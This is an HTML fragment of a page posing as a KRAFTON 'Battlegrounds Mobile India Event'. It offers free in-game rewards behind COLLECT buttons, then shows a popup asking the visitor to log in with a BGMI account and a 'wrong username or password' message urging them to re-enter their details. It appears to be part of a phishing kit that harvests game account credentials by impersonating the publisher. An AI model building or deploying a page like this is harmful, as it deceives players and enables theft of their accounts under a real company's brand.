...
<meta property="og:title" content="Battlegrounds Mobile Event">
...
<meta property="og:site_name" content="Battlegrounds Mobile Event">
...
<title>Battlegrounds Mobile India Event</title>
...
<div class="event-notification-content">JOIN AND GET YOUR EXCLUSIVE REWARD NOW</div> <!--- event-notification-content --->
...
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/x1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/x1.png">COLLECT</button>
</div>
</div>
...
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/x2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/x2.png">COLLECT</button>
</div>
</div>
...
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/x3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/x3.png">COLLECT</button>
</div>
</div>
<!-- ancient -->
<div class="item itemShine">
...
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/cat.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/cat.png">COLLECT</button>
</div>
</div>
<!-- END ANCIENT -->
<!-- weapons -->
...
<div class="footer-txt-copyright">ⓒ  KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
...
<div class="popup-box-bg">
<div class="popup-alerts">Log in using your BGMI MOBILE account</div> <!--- popup-alert --->
...
Hi,
<br>
Thank you for joining our Battlegrounds Mobile India Event
<br>
<i class="fa fa-check-circle fa-2x"></i>
<br>
You have entred wrong username or password.
<br>
Please check your login details to get the reward
<br>
